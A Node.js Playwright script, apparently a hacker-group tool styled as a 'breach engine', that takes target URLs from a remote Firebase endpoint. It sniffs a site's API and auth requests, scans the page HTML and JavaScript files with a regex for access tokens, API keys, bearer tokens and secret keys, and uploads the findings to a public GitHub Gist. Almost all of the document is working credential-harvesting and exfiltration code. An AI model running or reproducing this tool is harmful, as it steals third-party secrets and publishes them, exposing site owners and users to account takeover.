const { chromium } = require('playwright');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

// CONFIGURATION
const FIREBASE_URL = "https://kall-e4441-default-rtdb.asia-southeast1.firebasedatabase.app/scraper/request.json";
const GITHUB_TOKEN = process.env.XY_GIST_TOKEN;

async function runXyUltimateScraper() {
    console.log(" [XY] INITIATING DEEP PENETRATION SYSTEM...");
    let browser;

    try {
        // 1. GET TARGET SIGNAL
        const { data: request } = await axios.get(FIREBASE_URL);
        if (!request || !request.target) return console.log(" [!] NO TARGET SIGNAL DETECTED.");

        console.log(` [>] LOCKING TARGET: ${request.target}`);

        // 2. LAUNCH BREACH ENGINE (PLAYWRIGHT)
        browser = await chromium.launch({ headless: true });
        const context = await browser.newContext({
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            viewport: { width: 1280, height: 720 }
        });
        
        const page = await context.newPage();
        const treasures = { 
            api_endpoints: [], 
            detected_tokens: [], 
            js_assets: [],
            meta: { 
                target: request.target, 
                description: request.desc || "Auto-Request",
                timestamp: new Date().toLocaleString(),
                author: "PoweredBy Kall & XyTeam" 
            } 
        };

        // 3. NETWORK SNIFFING (Intercept API & Data)
        page.on('request', req => {
            const url = req.url();
            if (url.match(/api|graphql|v1|json|auth|token|sign|config/i) && !url.match(/\.(png|jpg|css|woff|svg)/i)) {
                if (url.endsWith('.js')) {
                    treasures.js_assets.push(url);
                } else {
                    treasures.api_endpoints.push(url);
                }
            }
        });

        // 4. ENTER THE VAULT
        await page.goto(request.target, { waitUntil: 'networkidle', timeout: 60000 });
        
        // --- AUTO INTERACTION (FORCE RENDER) ---
        console.log(" [>] PERFORMING AUTO-SCROLL SCAN...");
        await page.evaluate(async () => {
            await new Promise((resolve) => {
                let totalHeight = 0;
                let distance = 200;
                let timer = setInterval(() => {
                    let scrollHeight = document.body.scrollHeight;
                    window.scrollBy(0, distance);
                    totalHeight += distance;
                    if (totalHeight >= scrollHeight || totalHeight > 15000) {
                        clearInterval(timer);
                        resolve();
                    }
                }, 100);
            });
        });

        // TUNGGU EXTRA 10 DETIK (Anti-Ampas)
        console.log(" [>] MINING DATA (HOLDING 10s)...");
        await page.waitForTimeout(10000);

        // 5. EXTRACT FROM HTML CONTENT
        const html = await page.content();
        const tokenRegex = /(?:accessToken|auth_token|api_key|token|bearer|secret|sk_)["']?\s*[:=]\s*["']([^"']+)["']/gi;
        const foundTokens = html.match(tokenRegex);
        if (foundTokens) treasures.detected_tokens = [...new Set(foundTokens)];

        // 6. JS CRACKER (Download & Scan .js files)
        console.log(` [>] CRACKING ${treasures.js_assets.length} JS ASSETS...`);
        for (const jsUrl of treasures.js_assets.slice(0, 5)) { // Limit top 5 JS
            try {
                const jsRes = await axios.get(jsUrl, { timeout: 5000 });
                const jsTokens = jsRes.data.match(tokenRegex);
                if (jsTokens) treasures.detected_tokens.push(...jsTokens);
            } catch (e) { continue; }
        }

        // 7. SAVE & BACKUP (FOR GIT PUSH)
        const domain = new URL(request.target).hostname.replace(/\./g, '_');
        const dir = path.join(__dirname, 'hasil');
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        
        const fileName = `${domain}_${Date.now()}.json`;
        fs.writeFileSync(path.join(dir, fileName), JSON.stringify(treasures, null, 4));

        // 8. SYNC TO GIST
        if (GITHUB_TOKEN) {
            console.log(" [>] SYNCING TO GIST VAULT...");
            await axios.post('https://api.github.com/gists', {
                description: `XY-BREACH: ${domain} | ${request.desc || ''}`,
                public: true,
                files: { [fileName]: { content: JSON.stringify(treasures, null, 4) } }
            }, { headers: { 'Authorization': `token ${GITHUB_TOKEN}` } });
            console.log(" [OK] DATA SECURED IN GIST.");
        }

    } catch (err) {
        console.error(` [ERR] BREACH FAILED: ${err.message}`);
    } finally {
        if (browser) await browser.close();
        console.log(" [SYS] AGENT WITHDRAWN.");
        process.exit(0);
    }
}

runXyUltimateScraper();
